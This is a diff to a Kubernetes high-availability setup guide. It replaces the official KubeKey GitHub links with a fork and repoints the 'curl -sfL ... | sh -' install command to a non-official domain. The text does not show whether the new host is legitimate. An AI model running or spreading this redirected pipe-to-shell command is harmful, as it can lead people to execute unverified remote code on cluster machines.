@@ -59,7 +59,7 @@ The second path for Kubernetes HA topology includes external etcd nodes. Separat
 
 ## Set Up a Highly Available Kubernetes Cluster Using KubeKey
 
-[KubeKey](https://github.com/kubesphere/kubekey) is an efficient installer built on kubeadm. It provides a convenient approach to the installation and configuration of your Kubernetes or K3s cluster. You can use it to create, scale, and upgrade your Kubernetes cluster with ease. It also allows you to install cloud-native add-ons as you set up your cluster.
+[KubeKey](https://github.com/whenegghitsrock/kubekey-carryon) is an efficient installer built on kubeadm. It provides a convenient approach to the installation and configuration of your Kubernetes or K3s cluster. You can use it to create, scale, and upgrade your Kubernetes cluster with ease. It also allows you to install cloud-native add-ons as you set up your cluster.
 
 ### Architecture
 
@@ -71,10 +71,10 @@ KubeKey has supported the quick deployment of HA clusters since v1.2.0. Specific
 
 Follow the steps below to download KubeKey.
 
-1. Download KubeKey from its [GitHub Release Page](https://github.com/kubesphere/kubekey/releases) or use the following command directly.
+1. Download KubeKey from its [GitHub Release Page](https://github.com/whenegghitsrock/kubekey-carryon/releases) or use the following command directly.
 
    ```bash
-   curl -sfL https://get-kk.kubesphere.io | VERSION=v2.0.0 sh -
+   curl -sfL https://get-kk.docs.kubesphere-carryon.top | VERSION=v2.0.0 sh -
    ```
 
 2. Make `kk` executable.
